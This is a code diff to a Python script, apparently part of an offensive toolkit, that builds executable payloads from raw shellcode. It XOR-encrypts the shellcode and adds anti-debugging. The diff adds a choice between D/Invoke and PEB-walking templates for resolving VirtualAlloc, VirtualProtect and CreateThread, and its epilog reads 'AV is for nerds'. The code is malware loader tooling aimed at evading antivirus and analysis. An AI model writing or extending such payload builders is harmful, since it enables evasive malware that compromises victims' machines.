@@ -1,16 +1,30 @@
 import binascii
 import argparse
 import subprocess
+import random
 import os
 
 def init_args():
     parser = argparse.ArgumentParser(
-                    prog='binToShell.py',
-                    description='Generate shellcode from bin file',
-                    epilog='Nice Conversions :)')
-    parser.add_argument('-b', '--bin', help='The binary file to convert to nice unsigned char shellcode', required=True)
-    parser.add_argument('-x', '--xor', help='XOR key to encrypt with', default='')
-    parser.add_argument('-ad', '--anti-debug', help='Enable anti debugging option', dest='debug', action='store_true')
+                    prog='builder.py',
+                    description='Build an executable payload with encrypted shellcode from a bin file',
+                    epilog='AV is for nerds')
+    
+    parser.add_argument('-b', '--bin', help='The binary file to convert to nice unsigned char shellcode', 
+                        required=True)
+
+    parser.add_argument('-x', '--xor', help='XOR key to encrypt with', 
+                        default='')
+
+    parser.add_argument('-ad', '--anti-debug', help='Enable anti debugging option', 
+                        dest='debug', 
+                        action='store_true')
+    
+    parser.add_argument('-l', '--load', 
+                        help='Method to use to dynamically load functions', 
+                        choices=['dinvoke', 'pebwalk'],
+                        dest='method',
+                        default='dinvoke')
 
     return parser.parse_args()
 
@@ -59,7 +73,13 @@ void antiDebug()
     }
 }'''
     funcs = [('Kernel32.dll', '<KERNEL32>'), ('CreateThread', '<CREATE_THREAD>'), ('VirtualAlloc', '<VIRTUAL_ALLOC>'), ('VirtualProtect', '<VIRTUAL_PROTECT>')]
-    with open("./Source.cpp", 'r') as f:
+    loadMethods = {
+        'dinvoke': 'DInvoke.cpp',
+        'pebwalk': 'PEBWalk.cpp'
+    }
+    srcDir = 'src'
+
+    with open(os.path.join(srcDir, loadMethods[args.method]), 'r') as f:
         source = f.read()
 
     try:
